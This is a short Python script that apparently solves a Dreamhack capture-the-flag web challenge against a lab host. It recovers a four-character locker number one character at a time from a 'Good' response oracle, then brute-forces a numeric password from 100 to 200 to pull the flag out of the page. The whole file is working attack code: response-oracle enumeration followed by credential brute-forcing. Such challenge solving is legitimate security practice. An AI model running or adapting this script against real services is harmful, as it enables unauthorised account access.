from bs4 import BeautifulSoup
import requests
import string

URL = "http://host3.dreamhack.games:21168"
#URL = "http://127.0.0.1:8000"
LOCKER_NUM = ''
PASSWORD = ''
FLAG = None

def getLockerNum(num, front_pass):
    alphanumeric = string.ascii_lowercase + string.digits

    for passwd in alphanumeric:
        PAYLOAD = {'locker_num': front_pass + passwd, 'password': '101'}

        resp = requests.post(URL, data=PAYLOAD)

        if (resp.text.find('Good') > -1):
            print('Locker Number ' + str(num) + ' is ' + passwd)
            break
    return front_pass + passwd

for i in range(1, 5):
    LOCKER_NUM = getLockerNum(i, LOCKER_NUM)

for i in range(100, 201):
    PAYLOAD = {'locker_num' : LOCKER_NUM, 'password' : str(i)}

    resp = requests.post(URL, data=PAYLOAD)

    if (resp.text.find('FLAG:') > -1):
        print('Password is ' + str(i))

        soup = BeautifulSoup(resp.content,"html.parser")
        pre = soup.find('pre')
        FLAG = pre.contents[0]

        print(FLAG)
        break